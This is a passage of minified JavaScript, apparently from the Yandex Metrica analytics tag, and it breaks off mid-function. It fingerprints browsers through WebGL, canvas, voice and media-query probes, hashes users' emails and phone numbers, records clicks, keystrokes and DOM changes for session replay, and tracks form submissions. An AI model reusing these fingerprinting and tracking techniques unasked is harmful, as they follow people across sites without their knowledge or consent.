(function () {
  try {
    !(function () {
      function t(t) {
        var e = sr(t, Qs(t, "c")),
          n = wr(t),
          r = mf(t)(mr);
        return Cu(
          function (t, i, o) {
            var a = "sci" + o;
            return !(o = (function (t) {
              try {
                return parseInt(t, 10);
              } catch (t) {
                return null;
              }
            })(n.l(a))) || 1440 < r - o
              ? t.then(function () {
                  return e({ ua: ["sync.cook.int"] }, ["https://" + i], {
                    Sb: 1500,
                  }).then(function () {
                    n.o(a, r);
                  }, qo);
                })
              : t;
          },
          us.resolve(),
          ng
        );
      }
      function e(t, n, r) {
        return (
          void 0 === r && (r = 0),
          (n = Ru(n)),
          (n = Cu(
            function (n, i) {
              var o = i[0],
                a = i[1],
                u = Ao(a);
              return No(a) || u
                ? (u
                    ? (a = e(t, a, r + 1))
                    : r || "yandex_cid" !== o
                    ? ("phone_number" === o
                        ? (a = (function (t) {
                            return "8" === (t = Yp(t))[0]
                              ? "7" + t.slice(1)
                              : t;
                          })(a))
                        : "email" === o &&
                          (a = (function (t) {
                            var e = So(t).toLowerCase().split("@"),
                              n = e[0];
                            return (e = e[1])
                              ? (Vi(
                                  (e = e.replace("googlemail.com", "gmail.com"))
                                ) && (e = "yandex.ru"),
                                "yandex.ru" === e
                                  ? (n = n.replace(lu, "-"))
                                  : "gmail.com" === e &&
                                    (n = n.replace(lu, "")),
                                -1 !== (t = Mo(n, "+")) && (n = n.slice(0, t)),
                                n + "@" + e)
                              : t;
                          })(a)),
                      (a = (function (t, e) {
                        return new us(function (n, r) {
                          var i = new t.TextEncoder().encode(e);
                          t.crypto.subtle
                            .digest("SHA-256", i)
                            .then(function (e) {
                              e = new t.Blob([e], {
                                type: "application/octet-binary",
                              });
                              var i = new t.FileReader();
                              (i.onload = function (t) {
                                var e = (
                                  (t = mo(t, "target.result")) || ""
                                ).indexOf(",");
                                -1 !== e
                                  ? n(t.substring(e + 1))
                                  : r(ms("fpm.i"));
                              }),
                                i.readAsDataURL(e);
                            }, r);
                        });
                      })(t, a)))
                    : (a = us.resolve(a)),
                  n.push(
                    a.then(function (t) {
                      return [o, t];
                    })
                  ),
                  n)
                : n;
            },
            [],
            n
          )),
          us.all(n)
        );
      }
      function n(t, e, n) {
        (n = (t = Oo(n))[1]), "track" === t[0] && e({ version: "0", lc: n });
      }
      function r(t, e, n) {
        if (n) {
          var r = n.version;
          (n = mo(Jm, r + "." + n.lc)) &&
            ((e && Fu(n, $m)) || t("ym-" + n + "-" + r));
        }
      }
      function i(t, e) {
        return Cu(
          function (t, n) {
            return (t[n] = e), t;
          },
          {},
          t
        );
      }
      function o(t, e) {
        var n;
        return ((n = {}).width = t), (n.height = e || t), n;
      }
      function a(t, e) {
        if (!e) return !1;
        var n = Xi(t);
        return new RegExp(e).test("" + n.pathname + n.hash + n.search);
      }
      function u(t, e, n, r, i) {
        (n = l(t.document.body, n)),
          (r = l(t.document.body, r)),
          Fu(i.target, [n, r]) && h(t, e);
      }
      function c(t, e, n, r) {
        (n = Rm(t, r, n)) && h(t, e, n);
      }
      function s(t, e) {
        var n = f(t, e);
        return Cm(t, n);
      }
      function f(t, e) {
        var n = l(t.document.body, e);
        return n
          ? (function (t, e) {
              if (!e) return "";
              var n = [],
                r = mo(t, "document");
              return (
                J(t, e, function (t) {
                  if (t.nodeType === r.TEXT_NODE) var e = t.textContent;
                  else
                    t instanceof HTMLImageElement
                      ? (e = t.alt)
                      : t instanceof HTMLInputElement && (e = t.value);
                  (e = e && e.trim()) && n.push(e);
                }),
                0 === n.length ? "" : n.join(" ")
              );
            })(t, n)
          : "";
      }
      function h(t, e, n) {
        (e = vn(t, e)) &&
          ((t = vo(["dr", n || "" + Ki(t, 10, 99)])),
          e.params(vo(["__ym", t])));
      }
      function l(t, e) {
        var n = null;
        try {
          n = e ? ui(e, t) : n;
        } catch (t) {}
        return n;
      }
      function d(t) {
        return (
          (t = Zi(Pn(t) || "")),
          Vu(function (t) {
            return (t = t.charCodeAt(0).toString(2)), bh("0", 8, t);
          }, t)
        );
      }
      function p(t, e, n, r) {
        if (No((t = mo(r, "data")))) {
          var i = t.split("*");
          t = i[0];
          var o = i[1];
          (i = i[2]),
            "sc.frame" === t
              ? r.source.postMessage("sc.images*" + e, "*")
              : "sc.image" === t && o === e && n(i);
        }
      }
      function v(t, e, n, r) {
        (r = mi("button,input", t, (r = mo(r, "target")))) &&
          "submit" === r.type &&
          (r = Up(t, r)) &&
          (n.push(r), Br(t, Eo([!1, t, e, n, r], m), 300));
      }
      function m(t, e, n, r, i) {
        var o = jo(e)(i, r),
          a = -1 !== o;
        (t || a) &&
          (a && r.splice(o, 1),
          (t = "?" + Li((t = tt(e, i)))),
          (r = Eo(
            [e, n, "Form goal. Counter " + n.id + ". Form: " + t + "."],
            g
          )),
          md(e, n, "form", r)(t));
      }
      function g(t, e, n) {
        return pm(t, e).then(function (r) {
          r && on(t, e, n)();
        });
      }
      function b(t) {
        return lo(
          (t = (function (t) {
            if (!(t = Es(t))) return "";
            t = t("video");
            try {
              var e = yo("canPlayType", t),
                n = Yu(function (t) {
                  return Vu(po(Ho, yo("concat", t + "; codecs=")), Rd);
                }, Sd);
              return Vu(e, [].concat(Sd, n));
            } catch (t) {
              return "canPlayType";
            }
          })(t))
        )
          ? iu("x", t)
          : t;
      }
      function y(t) {
        return iu(
          "x",
          (function (t) {
            var e = mo(t, "speechSynthesis.getVoices");
            return e
              ? ((t = yu(e, t.speechSynthesis)),
                Yu(function (t) {
                  return Vu(wo(t, mo), dm);
                }, t()))
              : "";
          })(t) || []
        );
      }
      function w(t) {
        if ((t = vh(t)))
          try {
            for (var e = [], n = 0; n < ph.length; n += 1) {
              var r = t(ph[n]);
              e.push(r);
            }
            var i = e;
          } catch (t) {
            i = [];
          }
        else i = [];
        return i ? iu("x", i) : "";
      }
      function E(t) {
        var e = (function (t) {
          var e = mo(t, "matchMedia");
          if (!e || !zo("matchMedia", e)) return "";
          var n = yo("matchMedia", t);
          return Cu(
            function (t, e) {
              return (t[e] = n("(" + e + ")")), t;
            },
            {},
            Md
          );
        })(t);
        return e
          ? iu(
              "x",
              Vu(function (t) {
                return (
                  (t = e[t]),
                  iu(
                    "x",
                    Vu(po(Ho, yo("concat", ""), wo(t, mo)), [
                      "matches",
                      "media",
                    ])
                  )
                );
              }, Mu(e))
            )
          : "";
      }
      function x(t, e) {
        var n = e.ih;
        if (
          !(function (t, e) {
            if (!ko(t.Float32Array)) return !1;
            var n = mo(e, "canvas");
            if (!n || !zo("toDataUrl", n.toDataURL)) return !1;
            try {
              e.createBuffer();
            } catch (t) {
              return !1;
            }
            return !0;
          })(t, n)
        )
          return "";
        var r = [];
        t: {
          var i = (function (t, e) {
            return [
              function () {
                var n = e.createBuffer();
                (n && e.getParameter && zo("getParameter", e.getParameter)) ||
                  Id(),
                  e.bindBuffer(e.ARRAY_BUFFER, n);
                var r = new t.Float32Array(Pd);
                e.bufferData(e.ARRAY_BUFFER, r, e.STATIC_DRAW),
                  (n.Ci = 3),
                  (n.Qi = 3),
                  (r = e.createProgram());
                var i = e.createShader(e.VERTEX_SHADER);
                return (r && i) || Id(), { ue: r, Tj: i, Sj: n };
              },
              function (t) {
                var n = t.ue,
                  r = t.Tj;
                return (
                  e.shaderSource(
                    r,
                    "attribute vec2 attrVertex;varying vec2 varyinTexCoordinate;uniform vec2 uniformOffset;void main(){varyinTexCoordinate=attrVertex+uniformOffset;gl_Position=vec4(attrVertex,0,1);}"
                  ),
                  e.compileShader(r),
                  e.attachShader(n, r),
                  (n = e.createShader(e.FRAGMENT_SHADER)) || Id(),
                  Nu(t, { Ph: n })
                );
              },
              function (t) {
                var n = t.ue,
                  r = t.Ph;
                return (
                  e.shaderSource(
                    r,
                    "precision mediump float;varying vec2 varyinTexCoordinate;void main() {gl_FragColor=vec4(varyinTexCoordinate,0,1);}"
                  ),
                  e.compileShader(r),
                  e.attachShader(n, r),
                  e.linkProgram(n),
                  e.useProgram(n),
                  t
                );
              },
              function (t) {
                var n = t.ue;
                return (
                  (t = t.Sj),
                  (n.Rj = e.getAttribLocation(n, "attrVertex")),
                  (n.Si = e.getUniformLocation(n, "uniformOffset")),
                  e.enableVertexAttribArray(n.Kk),
                  e.vertexAttribPointer(n.Rj, t.Ci, e.FLOAT, !1, 0, 0),
                  e.uniform2f(n.Si, 1, 1),
                  e.drawArrays(e.TRIANGLE_STRIP, 0, t.Qi),
                  e.canvas
                );
              },
            ];
          })(t, n);
          try {
            var o = Eo(i, po)()();
            break t;
          } catch (t) {
            if ("ccf" === t.message) {
              o = null;
              break t;
            }
            eo(t);
          }
          o = void 0;
        }
        if (mu(o)) var a = "";
        else
          try {
            a = o.toDataURL();
          } catch (t) {
            a = "";
          }
        (o = a) && r.push(o);
        var u = n.getContextAttributes();
        try {
          var c =
            (Vo(n.getSupportedExtensions, "getSupportedExtensions") &&
              n.getSupportedExtensions()) ||
            [];
        } catch (t) {
          c = [];
        }
        (c = iu(";", c)),
          (o = Dt(n.getParameter(n.ALIASED_LINE_WIDTH_RANGE), n)),
          (i = Dt(n.getParameter(n.ALIASED_POINT_SIZE_RANGE), n)),
          (a = n.getParameter(n.ALPHA_BITS)),
          (u = u && u.antialias ? "yes" : "no");
        var s = n.getParameter(n.BLUE_BITS),
          f = n.getParameter(n.DEPTH_BITS),
          h = n.getParameter(n.GREEN_BITS),
          l =
            n.getExtension("EXT_texture_filter_anisotropic") ||
            n.getExtension("WEBKIT_EXT_texture_filter_anisotropic") ||
            n.getExtension("MOZ_EXT_texture_filter_anisotropic");
        if (l) {
          var d = n.getParameter(l.MAX_TEXTURE_MAX_ANISOTROPY_EXT);
          0 === d && (d = 2);
        }
        C(
          r,
          (d = {
            mk: c,
            "webgl aliased line width range": o,
            "webgl aliased point size range": i,
            "webgl alpha bits": a,
            "webgl antialiasing": u,
            "webgl blue bits": s,
            "webgl depth bits": f,
            "webgl green bits": h,
            "webgl max anisotropy": l ? d : null,
            "webgl max combined texture image units": n.getParameter(
              n.MAX_COMBINED_TEXTURE_IMAGE_UNITS
            ),
            "webgl max cube map texture size": n.getParameter(
              n.MAX_CUBE_MAP_TEXTURE_SIZE
            ),
            "webgl max fragment uniform vectors": n.getParameter(
              n.MAX_FRAGMENT_UNIFORM_VECTORS
            ),
            "webgl max render buffer size": n.getParameter(
              n.MAX_RENDERBUFFER_SIZE
            ),
            "webgl max texture image units": n.getParameter(
              n.MAX_TEXTURE_IMAGE_UNITS
            ),
            "webgl max texture size": n.getParameter(n.MAX_TEXTURE_SIZE),
            "webgl max varying vectors": n.getParameter(n.MAX_VARYING_VECTORS),
            "webgl max vertex attribs": n.getParameter(n.MAX_VERTEX_ATTRIBS),
            "webgl max vertex texture image units": n.getParameter(
              n.MAX_VERTEX_TEXTURE_IMAGE_UNITS
            ),
            "webgl max vertex uniform vectors": n.getParameter(
              n.MAX_VERTEX_UNIFORM_VECTORS
            ),
            "webgl max viewport dims": Dt(
              n.getParameter(n.MAX_VIEWPORT_DIMS),
              n
            ),
            "webgl red bits": n.getParameter(n.RED_BITS),
            "webgl renderer": n.getParameter(n.RENDERER),
            "webgl shading language version": n.getParameter(
              n.SHADING_LANGUAGE_VERSION
            ),
            "webgl stencil bits": n.getParameter(n.STENCIL_BITS),
            "webgl vendor": n.getParameter(n.VENDOR),
            "webgl version": n.getParameter(n.VERSION),
          }),
          ": "
        );
        t: {
          try {
            var p = n.getExtension("WEBGL_debug_renderer_info");
            if (p) {
              var v = {
                "webgl unmasked vendor": n.getParameter(
                  p.UNMASKED_VENDOR_WEBGL
                ),
                "webgl unmasked renderer": n.getParameter(
                  p.UNMASKED_RENDERER_WEBGL
                ),
              };
              break t;
            }
          } catch (t) {}
          v = {};
        }
        return (
          C(r, v),
          n.getShaderPrecisionFormat
            ? (C(
                r,
                (function (t) {
                  return Cu(
                    function (t, e) {
                      var n = e[0],
                        r = e[1];
                      return (
                        (t[n + " precision"] = mo(r, "precision") || "n"),
                        (t[n + " precision rangeMin"] =
                          mo(r, "rangeMin") || "n"),
                        (t[n + " precision rangeMax"] =
                          mo(r, "rangeMax") || "n"),
                        t
                      );
                    },
                    {},
                    [
                      [
                        "webgl vertex shader high float",
                        t.getShaderPrecisionFormat(
                          t.VERTEX_SHADER,
                          t.HIGH_FLOAT
                        ),
                      ],
                      [
                        "webgl vertex shader medium",
                        t.getShaderPrecisionFormat(
                          t.VERTEX_SHADER,
                          t.MEDIUM_FLOAT
                        ),
                      ],
                      [
                        "webgl vertex shader low float",
                        t.getShaderPrecisionFormat(
                          t.VERTEX_SHADER,
                          t.LOW_FLOAT
                        ),
                      ],
                      [
                        "webgl fragment shader high float",
                        t.getShaderPrecisionFormat(
                          t.FRAGMENT_SHADER,
                          t.HIGH_FLOAT
                        ),
                      ],
                      [
                        "webgl fragment shader medium float",
                        t.getShaderPrecisionFormat(
                          t.FRAGMENT_SHADER,
                          t.MEDIUM_FLOAT
                        ),
                      ],
                      [
                        "webgl fragment shader low float",
                        t.getShaderPrecisionFormat(
                          t.FRAGMENT_SHADER,
                          t.LOW_FLOAT
                        ),
                      ],
                      [
                        "webgl vertex shader high int",
                        t.getShaderPrecisionFormat(t.VERTEX_SHADER, t.HIGH_INT),
                      ],
                      [
                        "webgl vertex shader medium int",
                        t.getShaderPrecisionFormat(
                          t.VERTEX_SHADER,
                          t.MEDIUM_INT
                        ),
                      ],
                      [
                        "webgl vertex shader low int",
                        t.getShaderPrecisionFormat(t.VERTEX_SHADER, t.LOW_INT),
                      ],
                      [
                        "webgl fragment shader high int",
                        t.getShaderPrecisionFormat(
                          t.FRAGMENT_SHADER,
                          t.HIGH_INT
                        ),
                      ],
                      [
                        "webgl fragment shader medium int",
                        t.getShaderPrecisionFormat(
                          t.FRAGMENT_SHADER,
                          t.MEDIUM_INT
                        ),
                      ],
                      [
                        "webgl fragment shader low int precision",
                        t.getShaderPrecisionFormat(
                          t.FRAGMENT_SHADER,
                          t.LOW_INT
                        ),
                      ],
                    ]
                  );
                })(n)
              ),
              iu("~", r))
            : iu("~", r)
        );
      }
      function C(t, e, n) {
        void 0 === n && (n = ":"),
          zu(function (e) {
            return t.push("" + e[0] + n + e[1]);
          }, Ru(e));
      }
      function A(t) {
        var e = (function (t) {
          var e = mo(t, "ApplePaySession"),
            n = Xi(t).protocol;
          return !e || "https:" !== n || Ec(t) ? "" : e;
        })(t);
        return e
          ? Cu(
              function (t, n, r) {
                n = "" + (r + 1);
                var i = e.supportsVersion;
                return ko(i) ? (i.call(e, r + 1) ? t + n : t + "0") : t;
              },
              "",
              (function (t) {
                if (0 > t) return [];
                for (var e = [], n = 0; n <= t; n += 1) e.push(n);
                return e;
              })(19)
            ) + e.canMakePayments()
          : "";
      }
      function _(t, e) {
        var n = pf(t),
          r = "wv2rf:" + Fc(e),
          i = e.wb,
          o = Bd(t),
          a = n.l(r),
          u = e.Jj;
        return gu(o) || mu(a)
          ? cu(function (a, c) {
              xn(t, e, function (e) {
                var a = mo(e, "settings.webvisor.forms");
                (a = !mo(e, "settings.x3") && a),
                  (o = Bd(t) || mo(e, "settings.eu")),
                  n.o(r, Nf(a)),
                  c({ wb: i, Jf: !!o, Zf: a, Cg: u });
              });
            })
          : $n({ wb: i, Jf: o, Zf: !!ec(a), Cg: u });
      }
      function k(t) {
        if (t.type && t.event)
          switch (t.type) {
            case "page":
              var e = t.data,
                n = e.ya,
                r = e.bd,
                i = e.content;
              return (
                delete e.ya,
                delete e.bd,
                delete e.content,
                (e = {
                  type: "page",
                  data: { L: t.L || 0, content: i, ya: n, bd: r, Y: e },
                }),
                t.K && (e.K = t.K),
                e
              );
            case "event":
              t: {
                switch (
                  ((e = {
                    type: "event",
                    K: t.K,
                    data: { L: t.L, type: t.event, Y: {} },
                  }),
                  (n = Nu({}, t.data)),
                  t.event)
                ) {
                  case "zoom":
                    e.data.Y = {
                      Jg: { x: 0, y: 0, level: 0 },
                      Lg: n,
                      duration: 1,
                    };
                    break;
                  case "keystroke":
                    e.data.Y = n.Fc;
                    break;
                  case "deviceRotation":
                  case "resize":
                    e.data.Y = n;
                    break;
                  case "windowfocus":
                  case "windowblur":
                  case "focus":
                    (e.data.target = n.target), (e.data.Y = null);
                    break;
                  case "touchmove":
                  case "touchstart":
                  case "touchend":
                  case "touchcancel":
                  case "touchforcechange":
                  case "scroll":
                  case "change":
                  case "click":
                  case "mousemove":
                  case "mousedown":
                  case "mouseup":
                  case "selection":
                  case "stylechange":
                    (e.data.target = n.target), delete n.target, (e.data.Y = n);
                    break;
                  case "srcset":
                    t = {
                      type: "mutation",
                      K: t.K,
                      data: {
                        L: t.L,
                        Y: {
                          Aa: [
                            {
                              nd: [
                                {
                                  id: n.target,
                                  vb: { src: { Jc: "", n: n.value, r: !1 } },
                                  wa: 0,
                                },
                              ],
                            },
                          ],
                          index: 0,
                        },
                      },
                    };
                    break t;
                }
                t = e;
              }
              break;
            case "mutation":
              return (function (t) {
                var e = Nu({}, t.data),
                  n = [];
                switch (t.event) {
                  case "tc":
                    n = [
                      {
                        d: [
                          {
                            id: e.target,
                            ec: { Jc: "", n: e.value },
                            wa: e.index,
                          },
                        ],
                      },
                    ];
                    break;
                  case "ac":
                    n = [
                      {
                        nd: [
                          {
                            id: e.target,
                            vb: Cu(
                              function (t, e) {
                                var n = e[1];
                                return (
                                  (t[e[0]] = { Jc: "", n: n, r: _o(n) }), t
                                );
                              },
                              {},
                              Ru(e.attributes)
                            ),
                            wa: e.index,
                          },
                        ],
                      },
                    ];
                    break;
                  case "re":
                    n = [
                      {
                        Ve: Vu(function (t) {
                          return { id: t, wa: e.index };
                        }, e.ga),
                      },
                    ];
                    break;
                  case "ad":
                    n = [
                      {
                        Ye: Vu(function (t) {
                          return {
                            id: t.id,
                            Rf: t.name,
                            Sf: t.Qf,
                            je: t.parent,
                            me: t.oe,
                            ae: t.next,
                            vb: t.attributes,
                            wa: e.index,
                            ec: t.content,
                            Ma: t.hidden,
                          };
                        }, e.ga),
                      },
                    ];
                }
                return {
                  type: "mutation",
                  K: t.K,
                  data: { L: t.L, Y: { Aa: n, index: e.index } },
                };
              })(t);
          }
        return t;
      }
      function T(t, e) {
        try {
          return Bu(
            po(Au("contentWindow"), ou(e)),
            Zi(t.document.querySelectorAll("iframe"))
          );
        } catch (t) {
          return null;
        }
      }
      function S(t, e, n) {
        (t = Oi(t, n)), e.postMessage(t, "*");
      }
      function R() {
        return (
          M() + M() + "-" + M() + "-" + M() + "-" + M() + "-" + M() + M() + M()
        );
      }
      function M() {
        return Math.floor(65536 * (1 + Math.random()))
          .toString(16)
          .substring(1);
      }
      function N(t, e, n, r, i) {
        void 0 === r && (r = {}), void 0 === i && (i = bi(e));
        var o = Nu(
          Cu(
            function (t, e) {
              return (t[e.name] = e.value), t;
            },
            {},
            Zi(e.attributes)
          ),
          r
        );
        Nu(
          o,
          (function (t, e, n) {
            var r = {};
            return (
              xt(t)
                ? (r.value = t.value || n.value)
                : "IMG" !== e || n.src || (r.src = ""),
              r
            );
          })(e, i, o)
        );
        var a =
          (r = Cu(
            function (r, a) {
              var u = a[0],
                c = D(t, e, u, a[1], n, i),
                s = c.value;
              return _o(s) ? delete o[u] : (o[u] = s), r || c.gb;
            },
            !1,
            Ru(o)
          )) && Ei(e);
        return (
          a && ((o.width = a.width), (o.height = a.height)), { gb: r, ah: o }
        );
      }
      function D(t, e, n, r, i, o) {
        void 0 === o && (o = bi(e));
        var a = { gb: !1, value: r };
        return (
          xt(e)
            ? "value" === n
              ? !_o(r) &&
                "" !== r &&
                ((n = i.Jf),
                (o = i.Zf),
                (i = _t(t, e)),
                o
                  ? ((t = (n = bt(t, e, n)).Rd),
                    (e = n.Cd),
                    (n = n.jb),
                    (a.gb = !e && (i || t)))
                  : ((a.gb = i), (n = !At(e))),
                n || i) &&
                (a.value = iu("", Vu(wo("•", Ho), ("" + r).split(""))))
              : "checked" === n &&
                Fu((e.getAttribute("type") || "").toLowerCase(), gv)
              ? (a.value = e.checked ? "checked" : null)
              : bv.test(n) && Ta(t, e) && (a.value = null)
            : "IMG" === o && "src" === n
            ? (i = _t(t, e))
              ? ((a.gb = i),
                (a.value =
                  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="))
              : (a.value =
                  (e.getAttribute("srcset") ? e.currentSrc : "") || e.src)
            : "A" === o && "href" === n
            ? (a.value = r ? "#" : "")
            : (Fu(n, ["srcset", "integrity", "crossorigin", "password"]) ||
                (2 < n.length && 0 === Mo(n, "on")) ||
                ("IFRAME" === o && "src" === n) ||
                ("SCRIPT" === o && Fu(n, ["src", "type"]))) &&
              (a.value = null),
          a
        );
      }
      function P(t, e, n, r) {
        return (
          void 0 === r && (r = "wv2"),
          {
            G: function (i, o) {
              return Ur(t, r + "." + n + "." + o, i, void 0, e);
            },
          }
        );
      }
      function I(t, e) {
        var n = qh(t),
          r = Sl(t, "r", e),
          i = Ur(t, "rts.p");
        return xn(
          t,
          e,
          yu(
            Cu,
            null,
            function (t, e) {
              var n = { id: e.qh, aa: e.aa };
              return (
                (n = r(
                  { $: e.ej, H: Uc(e.eh), F: e.N, Ob: e.Ob },
                  n,
                  e.kj
                ).catch(i)),
                t.then(wo(n, Ho))
              );
            },
            us.resolve(""),
            n
          )
        ).catch(i);
      }
      function O(t, e, n) {
        e = sa(t, void 0, e);
        var r = mo((e = ov(t, e.l("phc_settings") || "")), "clientId"),
          i = mo(e, "orderId"),
          o = mo(e, "service_id"),
          a = mo(e, "phones") || [];
        return r && i && a
          ? iv(t, n.bc, { Ag: L })
              .ag(a)
              .then(function (t) {
                return (function (t, e, n, r, i) {
                  var o;
                  e.yb &&
                    e.Jb &&
                    ((e.yb === t.yb && e.Jb === t.Jb) ||
                      Nu(t, e, { ha: {}, $a: !0 }),
                    0 < i && Ji(t.ra, [i]),
                    zu(function (e) {
                      var n,
                        r,
                        i = e[0];
                      e = e[1];
                      var o = +(t.ha[i] && t.ha[i][e] ? t.ha[i][e] : 0);
                      Nu(t.ha, (((n = {})[i] = (((r = {})[e] = o), r)), n));
                    }, r),
                    zu(function (e) {
                      var n,
                        r,
                        i = e[0];
                      e = e[1];
                      var o = 1 + (t.ha[i] ? t.ha[i][e] : 0);
                      Nu(t.ha, (((n = {})[i] = (((r = {})[e] = o), r)), n));
                    }, n),
                    t.Lf &&
                      (t.$a || n.length) &&
                      ((e = vn(t.b, t.bc)) &&
                        e.params(
                          "__ym",
                          "phc",
                          (((o = {}).clientId = t.yb),
                          (o.orderId = t.Jb),
                          (o.service_id = t.pg),
                          (o.phones = t.ha),
                          (o.performance = t.ra),
                          o)
                        ),
                      (t.$a = !1)));
                })(n, { yb: r, Jb: i, pg: o }, t.ha, a, t.ra);
              })
              .catch(function () {})
          : us.resolve();
      }
      function L(t, e, n) {
        if (((t = zp(n.Tc)), "href" === n.xe)) {
          var r = n.ob;
          if (((n = (e = r.href).replace(t, n.Sa)), e !== n))
            return (r.href = n), !0;
        } else if (
          (t =
            null === (r = n.ob.textContent) || void 0 === r
              ? void 0
              : r.replace(t, n.Sa)) &&
          t !== n.ob.textContent
        )
          return (n.ob.textContent = t), !0;
        return !1;
      }
      function j(t, e) {
        try {
          var n = e.origin;
        } catch (t) {}
        if (n) {
          var r = Wu(po(bo, cu(n)), [
            /^http:\/\/([\w\-.]+\.)?webvisor\.com\/?$/,
            /^https:\/\/([\w\-.]+\.)?metri[kc]a\.yandex\.(ru|ua|by|kz|com|com\.tr)\/?$/,
          ]);
          (n = Fu(n.replace(/\/?$/, "/"), Zp)),
            (r || n) &&
              "appendremote" === mo((r = ua(t, e.data)), "action") &&
              ev(t, e, r);
        }
      }
      function B(t, e) {
        var n,
          r,
          i,
          o,
          a = e.data;
        a = void 0 === a ? "" : a;
        var u = e.id;
        u = void 0 === u ? "" : u;
        var c = Pu(t),
          s = {};
        (s.getCachedTags = Ds),
          (s.form =
            (((n = {}).closest = wo(t, Up)),
            (n.select = Xp),
            (n.getData = wo(t, tt)),
            n)),
          (s.button =
            (((r = {}).closest = wo(t, ri)),
            (r.select = Hs),
            (r.getData = wo(t, ni)),
            r)),
          (s.phone = (((i = {}).hidePhones = Eo([t, null, [a]], G)), i)),
          (s.status = (((o = {}).checkStatus = Eo([t, ec(u)], F)), o)),
          c.o("_u", s),
          (n = void 0 === (n = e.lang) ? "" : n),
          (r = void 0 === (r = e.appVersion) ? "" : r),
          (i = void 0 === (i = e.fileId) ? "" : i),
          (o = void 0 !== (o = e.beta) && o),
          (r = iu(".", po(qu(po(Ho, ec)), ju(Boolean))(r.split(".")))),
          Fu(i, tv) && Fu(n, ["ru", "en", "tr"])
            ? (n = Qp(
                (n =
                  (o
                    ? "https://s3.mds.yandex.net/internal-metrika-betas"
                    : "https://yastatic.net/s3/metrika") +
                  (r ? "/" + r : "") +
                  "/form-selector/" +
                  i +
                  "_" +
                  n +
                  ".js")
              )
                ? n
                : "")
            : (n = ""),
          n && si(t, { src: n });
      }
      function F(t) {
        var e,
          n = Jp(t);
        return (
          (t = Pu(t).l("getCounters", io)()),
          (t = Vu(Au("id"), t)),
          ((e = { id: n }).counterFound = !!n && Fu(n, t)),
          e
        );
      }
      function G(t, e, n) {
        var r;
        (e = X(t, e, { Ag: H, Mi: ((r = {}), (r.href = !0), r) })),
          (n = Lu(
            Boolean,
            Vu(function (t) {
              return "*" === t ? t : Yp(t);
            }, n)
          ));
        var i = Vu(po(Ho, yo("concat", [""]), Eu("reverse"), Wo), n);
        (r = Lr(t, (n = Gr(t)), 1e3)),
          (e = yu(e.ag, e, i, !1)),
          r.C(e),
          (function (t, e) {
            os(t).C(t, ["load"], e.O);
          })(t, n),
          U(t, n),
          e();
      }
      function H(t, e, n) {
        var r = Es(t),
          i = n.ob,
          o = n.Tc,
          a = i.parentNode,
          u = i.textContent;
        if ("text" === n.xe && u && r && a) {
          (n = r("small")), Kp(n);
          var c = u.split(""),
            s = u.replace(/\s/g, "").length;
          return (
            zu(
              yo("appendChild", n),
              Cu(
                function (t, e) {
                  var n = t.ga,
                    i = t.Hg,
                    o = r("small");
                  o.innerHTML = e;
                  var a = qp.test(e);
                  return (
                    Kp(o),
                    a && (o.style.opacity = "" + (s - i - 1) / s),
                    n.push(o),
                    { ga: n, Hg: i + (a ? 1 : 0) }
                  );
                },
                { ga: [], Hg: 0 },
                c
              ).ga
            ),
            (function (t, e, n, r) {
              function i() {
                if (
                  (zu(wo(["style", "opacity", ""], vo), Zi(n.childNodes)), e)
                ) {
                  var i = vn(t, e);
                  i && i.extLink("tel:" + r, {});
                }
                a(), u();
              }
              var o = os(t),
                a = qo,
                u = qo;
              a = o.C(n, ["mouseenter"], function (e) {
                if (e.target === n) {
                  var r = Br(t, i, 200, "ph.h.e");
                  (u || qo)(),
                    (u = o.C(n, ["mouseleave"], function (e) {
                      e.target === n && ro(t, r);
                    }));
                }
              });
            })(t, e, n, o),
            a.insertBefore(n, i),
            (i.textContent = ""),
            !0
          );
        }
        return !1;
      }
      function U(t, e) {
        return Z(t).then(function () {
          var n,
            r = t.document.body,
            i =
              (((n = {}).attributes = !0),
              (n.childList = !0),
              (n.subtree = !0),
              n);
          zo("MutationObserver", t.MutationObserver) &&
            new MutationObserver(e.O).observe(r, i);
        });
      }
      function X(t, e, n) {
        function r(n) {
          var r;
          return a(t, e, n)
            ? null === (r = o[n.Tc]) || void 0 === r
              ? void 0
              : r.fd
            : null;
        }
        var i,
          o,
          a = n.Ag,
          u =
            void 0 === (n = n.Mi)
              ? (((i = {}).href = !0), (i.text = !0), i)
              : n;
        return {
          ag: function (e) {
            return new us(function (n, i) {
              (e && e.length) || i(),
                (o = z()(e)),
                n(
                  Z(t)
                    .then(function () {
                      var e = mf(t),
                        n = e(gr),
                        i = u.href
                          ? (function (t, e) {
                              var n = t.document.body;
                              if (!n) return [];
                              var r = K(e);
                              return Cu(
                                function (n, i) {
                                  var o = mo(i, "href");
                                  try {
                                    var a = decodeURI(o || "");
                                  } catch (t) {
                                    a = "";
                                  }
                                  if ("tel:" === a.slice(0, 4)) {
                                    var u = (r.exec(a) || [])[0],
                                      c = u ? Yp(u) : "",
                                      s = e[c];
                                    gu(s) ||
                                      (!c && "*" !== s.fd[0]) ||
                                      (n.push({
                                        xe: "href",
                                        ob: i,
                                        Tc: c,
                                        Sa: Y(u, e[c].Sa),
                                        yj: o,
                                      }),
                                      (o = Yp(a.slice(4))),
                                      (c = z()([c ? s.fd : [o, ""]])),
                                      n.push.apply(n, V(t, c, i)));
                                  }
                                  return n;
                                },
                                [],
                                Zi(n.querySelectorAll("a"))
                              );
                            })(t, o)
                          : [],
                        a = u.text ? V(t, o) : [];
                      return {
                        ha: Lu(lo, Lu(Boolean, Vu(r, i.concat(a)))),
                        ra: e(gr) - n,
                      };
                    })
                    .catch(function () {
                      return { ha: [], ra: 0 };
                    })
                );
            });
          },
        };
      }
      function V(t, e, n) {
        if ((void 0 === n && (n = t.document.body), !n)) return [];
        var r = [],
          i = K(e);
        return (
          J(
            t,
            n,
            function (t) {
              if (
                t !== n &&
                "script" !== (mo(t, "parentNode.nodeName") || "").toLowerCase()
              ) {
                var o = Lu(Boolean, i.exec(t.textContent || "") || []);
                zu(function (n) {
                  var i = Yp(n);
                  gu(e[i]) ||
                    r.push({
                      xe: "text",
                      ob: t,
                      Tc: i,
                      Sa: Y(n, e[i].Sa),
                      yj: t.textContent || "",
                    });
                }, o);
              }
            },
            function (t) {
              return i.test(t.textContent || "") ? 1 : 0;
            },
            t.NodeFilter.SHOW_TEXT
          ),
          r
        );
      }
      function z() {
        return go(function (t, e) {
          var n = Vu(Yp, e),
            r = n[0];
